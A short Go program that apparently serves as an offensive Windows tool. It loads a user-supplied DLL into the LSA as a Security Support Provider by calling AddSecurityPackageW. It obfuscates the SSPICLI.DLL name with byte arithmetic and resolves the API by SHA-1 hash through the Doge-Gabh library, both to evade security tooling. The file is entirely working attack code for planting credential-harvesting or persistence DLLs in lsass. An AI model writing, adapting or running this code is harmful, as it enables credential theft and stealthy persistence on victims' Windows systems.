package main

import (
	"crypto/sha1"
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"os"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

type SECURITY_PACKAGE_OPTIONS struct {
	Size          int
	Type          int
	Flags         int
	SignatureSize int
	Signature     int
}


func main(){
	if len(os.Args)!= 2{
		fmt.Println("input ssp dll path")
		os.Exit(0)
	}

	ssp_path := ""

	wg := new(sync.WaitGroup)
	wg.Add(1)
	go func() {
		defer wg.Done()
		ssp_path = os.Args[1]
	}()
	wg.Wait()

	if !is_full_path(ssp_path){
		fmt.Printf("You must provide a full path: %s\n", ssp_path)
		return
	}

	//AddSecurityPackageW
	ASSPW,_,e := gabh.MemFuncPtr(
		string([]byte{0x60-13,0x4d+6,0x57-7,0x51-8,0x34+15,0x4d-1,0x47+2,0x2c+2,0x52-14,0x5b-15,0x51-5}),//SSPICLI.DLL
		"cafbbc2487c4dc4bb5eb3afe104f123602102626",
		str2sha1,
		)

	if e != nil{
		fmt.Printf("Address of 'AddSecurityPackageW' not found\n")
		panic(e)
	}

	ssp_path_w,_ := syscall.UTF16PtrFromString(ssp_path)
	spo := SECURITY_PACKAGE_OPTIONS{}

	r1,_,_ := syscall.Syscall(uintptr(ASSPW),2,uintptr(unsafe.Pointer(ssp_path_w)),uintptr(unsafe.Pointer(&spo)),0)
	if r1 == 0x80090305{
		fmt.Printf("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n")
	}else{
		fmt.Printf("Done, status: 0x%x\n", r1)
	}
}

func is_full_path(p string)bool{
	if strings.Contains(p,":/")||strings.Contains(p,":\\"){
		return true
	}
	return false
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
